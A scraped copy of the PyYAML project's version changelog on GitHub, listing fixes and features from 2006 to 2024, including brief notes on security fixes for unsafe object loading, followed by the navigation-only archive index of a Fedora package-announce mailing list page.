=== Content from github.com_8fcc8710_20250121_003219.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyaml%2Fpyyaml%2Fblob%2Fmain%2FCHANGES)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyaml%2Fpyyaml%2Fblob%2Fmain%2FCHANGES)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=yaml%2Fpyyaml)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yaml](/yaml)
/
**[pyyaml](/yaml/pyyaml)**
Public

* [Notifications](/login?return_to=%2Fyaml%2Fpyyaml) You must be signed in to change notification settings
* [Fork
  525](/login?return_to=%2Fyaml%2Fpyyaml)
* [Star
   2.6k](/login?return_to=%2Fyaml%2Fpyyaml)

* [Code](/yaml/pyyaml)
* [Issues
  204](/yaml/pyyaml/issues)
* [Pull requests
  86](/yaml/pyyaml/pulls)
* [Actions](/yaml/pyyaml/actions)
* [Projects
  1](/yaml/pyyaml/projects)
* [Wiki](/yaml/pyyaml/wiki)
* [Security](/yaml/pyyaml/security)
* [Insights](/yaml/pyyaml/pulse)

Additional navigation options

* [Code](/yaml/pyyaml)
* [Issues](/yaml/pyyaml/issues)
* [Pull requests](/yaml/pyyaml/pulls)
* [Actions](/yaml/pyyaml/actions)
* [Projects](/yaml/pyyaml/projects)
* [Wiki](/yaml/pyyaml/wiki)
* [Security](/yaml/pyyaml/security)
* [Insights](/yaml/pyyaml/pulse)

## Files

 main
## Breadcrumbs

1. [pyyaml](/yaml/pyyaml/tree/main)
/
# CHANGES

Copy path Blame  Blame
## Latest commit

## History

[History](/yaml/pyyaml/commits/main/CHANGES)278 lines (217 loc) · 12 KB main
## Breadcrumbs

1. [pyyaml](/yaml/pyyaml/tree/main)
/
# CHANGES

Top
## File metadata and controls

* Code
* Blame

278 lines (217 loc) · 12 KB[Raw](https://github.com/yaml/pyyaml/raw/refs/heads/main/CHANGES)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277
For a complete changelog, see:
\* https://github.com/yaml/pyyaml/commits/
7.0.0.dev0 (TBD)
\* TBD
6.0.2 (2024-08-06)
\* https://github.com/yaml/pyyaml/pull/808 -- Support for Cython 3.x and Python 3.13
6.0.1 (2023-07-18)
\* https://github.com/yaml/pyyaml/pull/702 -- pin Cython build dep to < 3.0
6.0 (2021-10-13)
\* https://github.com/yaml/pyyaml/pull/327 -- Change README format to Markdown\* https://github.com/yaml/pyyaml/pull/483 -- Add a test for YAML 1.1 types\* https://github.com/yaml/pyyaml/pull/497 -- fix float resolver to ignore `.` and `.\_`\* https://github.com/yaml/pyyaml/pull/550 -- drop Python 2.7\* https://github.com/yaml/pyyaml/pull/553 -- Fix spelling of “hexadecimal”\* https://github.com/yaml/pyyaml/pull/556 -- fix representation of Enum subclasses\* https://github.com/yaml/pyyaml/pull/557 -- fix libyaml extension compiler warnings\* https://github.com/yaml/pyyaml/pull/560 -- fix ResourceWarning on leaked file descriptors\* https://github.com/yaml/pyyaml/pull/561 -- always require `Loader` arg to `yaml.load()`\* https://github.com/yaml/pyyaml/pull/564 -- remove remaining direct distutils usage
5.4.1 (2021-01-20)
\* https://github.com/yaml/pyyaml/pull/480 -- Fix stub compat with older pyyaml versions that may unwittingly load it
5.4 (2021-01-19)
\* https://github.com/yaml/pyyaml/pull/407 -- Build modernization, remove distutils, fix metadata, build wheels, CI to GHA\* https://github.com/yaml/pyyaml/pull/472 -- Fix for CVE-2020-14343, moves arbitrary python tags to UnsafeLoader\* https://github.com/yaml/pyyaml/pull/441 -- Fix memory leak in implicit resolver setup\* https://github.com/yaml/pyyaml/pull/392 -- Fix py2 copy support for timezone objects\* https://github.com/yaml/pyyaml/pull/378 -- Fix compatibility with Jython
5.3.1 (2020-03-18)
\* https://github.com/yaml/pyyaml/pull/386 -- Prevents arbitrary code execution during python/object/new constructor
5.3 (2020-01-06)
\* https://github.com/yaml/pyyaml/pull/290 -- Use `is` instead of equality for comparing with `None`\* https://github.com/yaml/pyyaml/pull/270 -- Fix typos and stylistic nit\* https://github.com/yaml/pyyaml/pull/309 -- Fix up small typo\* https://github.com/yaml/pyyaml/pull/161 -- Fix handling of \_\_slots\_\_\* https://github.com/yaml/pyyaml/pull/358 -- Allow calling add\_multi\_constructor with None\* https://github.com/yaml/pyyaml/pull/285 -- Add use of safe\_load() function in README\* https://github.com/yaml/pyyaml/pull/351 -- Fix reader for Unicode code points over 0xFFFF\* https://github.com/yaml/pyyaml/pull/360 -- Enable certain unicode tests when maxunicode not > 0xffff\* https://github.com/yaml/pyyaml/pull/359 -- Use full\_load in yaml-highlight example\* https://github.com/yaml/pyyaml/pull/244 -- Document that PyYAML is implemented with Cython\* https://github.com/yaml/pyyaml/pull/329 -- Fix for Python 3.10\* https://github.com/yaml/pyyaml/pull/310 -- Increase size of index, line, and column fields\* https://github.com/yaml/pyyaml/pull/260 -- Remove some unused imports\* https://github.com/yaml/pyyaml/pull/163 -- Create timezone-aware datetimes when parsed as such\* https://github.com/yaml/pyyaml/pull/363 -- Add tests for timezone
5.2 (2019-12-02)------------------
\* Repair incompatibilities introduced with 5.1. The default Loader was changed, but several methods like add\_constructor still used the old default https://github.com/yaml/pyyaml/pull/279 -- A more flexible fix for custom tag constructors https://github.com/yaml/pyyaml/pull/287 -- Change default loader for yaml.add\_constructor https://github.com/yaml/pyyaml/pull/305 -- Change default loader for add\_implicit\_resolver, add\_path\_resolver\* Make FullLoader safer by removing python/object/apply from the default FullLoader https://github.com/yaml/pyyaml/pull/347 -- Move constructor for object/apply to UnsafeConstructor\* Fix bug introduced in 5.1 where quoting went wrong on systems with sys.maxunicode <= 0xffff https://github.com/yaml/pyyaml/pull/276 -- Fix logic for quoting special characters\* Other PRs: https://github.com/yaml/pyyaml/pull/280 -- Update CHANGES for 5.1
5.1.2 (2019-07-30)------------------
\* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b2+
5.1.1 (2019-06-05)------------------
\* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b1
5.1 (2019-03-13)----------------
\* https://github.com/yaml/pyyaml/pull/35 -- Some modernization of the test running\* https://github.com/yaml/pyyaml/pull/42 -- Install tox in a virtualenv\* https://github.com/yaml/pyyaml/pull/45 -- Allow colon in a plain scalar in a flow context\* https://github.com/yaml/pyyaml/pull/48 -- Fix typos\* https://github.com/yaml/pyyaml/pull/55 -- Improve RepresenterError creation\* https://github.com/yaml/pyyaml/pull/59 -- Resolves #57, update readme issues link\* https://github.com/yaml/pyyaml/pull/60 -- Document and test Python 3.6 support\* https://github.com/yaml/pyyaml/pull/61 -- Use Travis CI built in pip cache support\* https://github.com/yaml/pyyaml/pull/62 -- Remove tox workaround for Travis CI\* https://github.com/yaml/pyyaml/pull/63 -- Adding support to Unicode characters over codepoint 0xffff\* https://github.com/yaml/pyyaml/pull/75 -- add 3.12 changelog\* https://github.com/yaml/pyyaml/pull/76 -- Fallback to Pure Python if Compilation fails\* https://github.com/yaml/pyyaml/pull/84 -- Drop unsupported Python 3.3\* https://github.com/yaml/pyyaml/pull/102 -- Include license file in the generated wheel package\* https://github.com/yaml/pyyaml/pull/105 -- Removed Python 2.6 & 3.3 support\* https://github.com/yaml/pyyaml/pull/111 -- Remove commented out Psyco code\* https://github.com/yaml/pyyaml/pull/129 -- Remove call to `ord` in lib3 emitter code\* https://github.com/yaml/pyyaml/pull/149 -- Test on Python 3.7-dev\* https://github.com/yaml/pyyaml/pull/158 -- Support escaped slash in double quotes "\/"\* https://github.com/yaml/pyyaml/pull/175 -- Updated link to pypi in release announcement\* https://github.com/yaml/pyyaml/pull/181 -- Import Hashable from collections.abc\* https://github.com/yaml/pyyaml/pull/194 -- Reverting https://github.com/yaml/pyyaml/pull/74\* https://github.com/yaml/pyyaml/pull/195 -- Build libyaml on travis\* https://github.com/yaml/pyyaml/pull/196 -- Force cython when building sdist\* https://github.com/yaml/pyyaml/pull/254 -- Allow to turn off sorting keys in Dumper (2)\* https://github.com/yaml/pyyaml/pull/256 -- Make default\_flow\_style=False\* https://github.com/yaml/pyyaml/pull/257 -- Deprecate yaml.load and add FullLoader and UnsafeLoader classes\* https://github.com/yaml/pyyaml/pull/261 -- Skip certain unicode tests when maxunicode not > 0xffff\* https://github.com/yaml/pyyaml/pull/263 -- Windows Appveyor build
3.13 (2018-07-05)-----------------
\* Resolved issues around PyYAML working in Python 3.7.
3.12 (2016-08-28)-----------------
\* Wheel packages for Windows binaries.\* Adding an implicit resolver to a derived loader should not affect the base loader.\* Uniform representation for OrderedDict? across different versions of Python.\* Fixed comparison to None warning.
3.11 (2014-03-26)-----------------
\* Source and binary distributions are rebuilt against the latest versions of Cython and LibYAML.
3.10 (2011-05-30)-----------------
\* Do not try to build LibYAML bindings on platforms other than CPython (Thank to olt(at)bogosoft(dot)com).\* Clear cyclic references in the parser and the emitter (Thank to kristjan(at)ccpgames(dot)com).\* Dropped support for Python 2.3 and 2.4.
3.09 (2009-08-31)-----------------
\* Fixed an obscure scanner error not reported when there is no line break at the end of the stream (Thank to Ingy).\* Fixed use of uninitialized memory when emitting anchors with LibYAML bindings (Thank to cegner(at)yahoo-inc(dot)com).\* Fixed emitting incorrect BOM characters for UTF-16 (Thank to Valentin Nechayev)\* Fixed the emitter for folded scalars not respecting the preferred line width (Thank to Ingy).\* Fixed a subtle ordering issue with emitting '%TAG' directives (Thank to Andrey Somov).\* Fixed performance regression with LibYAML bindings.
3.08 (2008-12-31)-----------------
\* Python 3 support (Thank to Erick Tryzelaar).\* Use Cython instead of Pyrex to build LibYAML bindings.\* Refactored support for unicode and byte input/output streams.
3.07 (2008-12-29)-----------------
\* The emitter learned to use an optional indentation indicator for block scalar; thus scalars with leading whitespaces could now be represented in a literal or folded style.\* The test suite is now included in the source distribution. To run the tests, type 'python setup.py test'.\* Refactored the test suite: dropped unittest in favor of a custom test appliance.\* Fixed the path resolver in CDumper.\* Forced an explicit document end indicator when there is a possibility of parsing ambiguity.\* More setup.py improvements: the package should be usable when any combination of setuptools, Pyrex and LibYAML is installed.\* Windows binary packages are built against LibYAML-0.1.2.\* Minor typos and corrections (Thank to Ingy dot Net and Andrey Somov).
3.06 (2008-10-03)-----------------
\* setup.py checks whether LibYAML is installed and if so, builds and installs LibYAML bindings. To force or disable installation of LibYAML bindings, use '--with-libyaml' or '--without-libyaml' respectively.\* The source distribution includes compiled Pyrex sources so building LibYAML bindings no longer requires Pyrex installed.\* 'yaml.load()' raises an exception if the input stream contains more than one YAML document.\* Fixed exceptions produced by LibYAML bindings.\* Fixed a dot '.' character being recognized as !!float.\* Fixed Python 2.3 compatibility issue in constructing !!timestamp values.\* Windows binary packages are built against the LibYAML stable branch.\* Added attributes 'yaml.\_\_version\_\_' and 'yaml.\_\_with\_libyaml\_\_'.
3.05 (2007-05-13)-----------------
\* Windows binary packages were built with LibYAML trunk.\* Fixed a bug that prevent processing a live stream of YAML documents in timely manner (Thanks edward(at)sweetbytes(dot)net).\* Fixed a bug when the path in add\_path\_resolver contains boolean values (Thanks jstroud(at)mbi(dot)ucla(dot)edu).\* Fixed loss of microsecond precision in timestamps (Thanks edemaine(at)mit(dot)edu).\* Fixed loading an empty YAML stream.\* Allowed immutable subclasses of YAMLObject.\* Made the encoding of the unicode->str conversion explicit so that the conversion does not depend on the default Python encoding.\* Forced emitting float values in a YAML compatible form.
3.04 (2006-08-20)-----------------
\* Include experimental LibYAML bindings.\* Fully support recursive structures.\* Sort dictionary keys. Mapping node values are now represented as lists of pairs instead of dictionaries. No longer check for duplicate mapping keys as it didn't work correctly anyway.\* Fix invalid output of single-quoted scalars in cases when a single quote is not escaped when preceded by whitespaces or line breaks.\* To make porting easier, rewrite Parser not using generators.\* Fix handling of unexpected block mapping values.\* Fix a bug in Representer.represent\_object: copy\_reg.dispatch\_table was not correctly handled.\* Fix a bug when a block scalar is incorrectly emitted in the simple key context.\* Hold references to the objects being represented.\* Make Representer not try to guess !!pairs when a list is represented.\* Fix timestamp constructing and representing.\* Fix the 'N' plain scalar being incorrectly recognized as !!bool.
3.03 (2006-06-19)-----------------
\* Fix Python 2.5 compatibility issues.\* Fix numerous bugs in the float handling.\* Fix scanning some ill-formed documents.\* Other minor fixes.
3.02 (2006-05-15)-----------------
\* Fix win32 installer. Apparently bdist\_wininst does not work well under Linux.\* Fix a bug in add\_path\_resolver.\* Add the yaml-highlight example. Try to run on a color terminal: `python yaml\_hl.py <any\_document.yaml`.
3.01 (2006-05-07)-----------------
\* Initial release. The version number reflects the codename of the project (PyYAML 3000) and differentiates it from the abandoned PyYaml module.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_1a82a6d6_20250121_003221.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
